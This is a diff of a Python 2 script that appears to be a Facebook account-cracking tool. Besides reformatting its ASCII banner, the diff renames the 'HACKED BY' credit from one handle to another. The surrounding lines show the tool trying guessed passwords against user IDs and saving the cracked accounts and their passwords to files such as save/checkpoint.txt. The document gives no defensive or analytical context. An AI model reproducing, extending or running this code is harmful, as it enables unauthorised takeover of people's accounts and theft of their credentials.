@@ -48,23 +48,20 @@ def cb():
     os.system('clear')
 
 
-	
-
-
-logo ="""
-\033[1;91m............##.........######\033[1;0m
+logo = """
+ \033[1;91m............##.........######\033[1;0m
 \033[1;91m..........##.##.......##\033[1;0m
 \033[1;97m.........##..##......##\033[1;0m
 \033[1;97m........#######.....######\033[1;0m
 \033[1;91m.......##....##....##\033[1;0m
 \033[1;91m......##.....##...##\033[1;0m
 \033[1;97m.....##......##..#######\033[1;0m
-
-
---------------------------------------------------
+ 
+ 
+ --------------------------------------------------
  Author           : Aadil/001
  GitHub           : https://github.com/Aadilafg001
- Facebook      : 100006267764888
+ Facebook         : 100006267764888
 --------------------------------------------------
 """
 back = 0
@@ -135,7 +132,7 @@ def Ali():
                 okb.close()
                 oks.append(c + user + pass1)
             elif 'www.facebook.com' in q['error_msg']:
-                print '\x1b[1;92mHACKED BY Aadil Cybery \x1b[1;92m ' + k + c + user + '  yes  ' + pass1 + '\n'
+                print '\x1b[1;92mHACKED BY Ali Cybery \x1b[1;92m ' + k + c + user + '  yes  ' + pass1 + '\n'
                 cps = open('save/checkpoint.txt', 'a')
                 cps.write(k + c + user + '   ' + pass1 + '\n')
                 cps.close()
@@ -151,7 +148,7 @@ def Ali():
                 okb.close()
                 oks.append(c + user + pass2)
             elif 'www.facebook.com' in q['error_msg']:
-                print '\x1b[1;92mHACKED BY Aadil Cybery \x1b[1;92m ' + k + c + user + '  yes  ' + pass2 + '\n'
+                print '\x1b[1;92mHACKED BY Ali Cybery \x1b[1;92m ' + k + c + user + '  yes  ' + pass2 + '\n'
                 cps = open('save/checkpoint.txt', 'a')
                 cps.write(k + c + user + '    ' + pass2 + '\n')
                 cps.close()
